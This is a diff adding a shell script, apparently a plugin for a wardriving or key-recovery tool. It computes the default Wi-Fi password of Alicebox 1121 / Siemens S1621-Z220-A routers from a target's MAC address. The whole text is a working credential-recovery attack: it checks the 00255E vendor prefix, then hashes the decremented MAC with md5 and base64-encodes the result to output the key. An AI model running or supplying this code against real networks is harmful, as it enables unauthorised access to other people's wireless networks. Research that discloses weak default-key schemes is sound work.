@@ -1,0 +1,20 @@
+#!/bin/sh
+# Implementation of Alicebox 1121 /Siemens S1621-Z220-A Default Password Algorithm:
+# Based on Poc from 
+#    http://www.wardriving-forum.de/forum/f275/standard-wlanpassw%F6rter-von-alice-boxen-70287.html
+#
+#
+# ESSID MAC CHANNEL ENCRYPTION 
+
+cd $(dirname $(readlink -f $0))
+. ../lib/plugin_core
+
+parse_plugin_args "$@"
+
+! check_vendor_mac $VENDOR_MAC "00255E" && echo "$VENDOR_MAC not affected" && exit 1
+
+# printf always makes string to lower, need that for correct md5sum
+ETHMAC=$( printf "%012x" $((0x${MAC}-1)) ) 
+TMP=$(printf $ETHMAC | md5sum)
+printf ${TMP:0:12} | base64
+exit 0
